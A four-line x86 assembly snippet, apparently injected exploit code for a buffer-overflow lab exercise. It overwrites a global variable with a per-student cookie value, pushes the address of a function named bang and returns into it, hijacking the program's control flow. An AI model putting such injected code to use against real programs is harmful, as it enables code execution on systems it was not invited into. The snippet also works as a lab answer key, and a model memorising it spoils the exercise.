movl $0x6c1145d7, (0x804c218) # change the global_value into bobobo's cookie
push $0x8048d05  # push the function-bang's address into stack
.align 4
ret
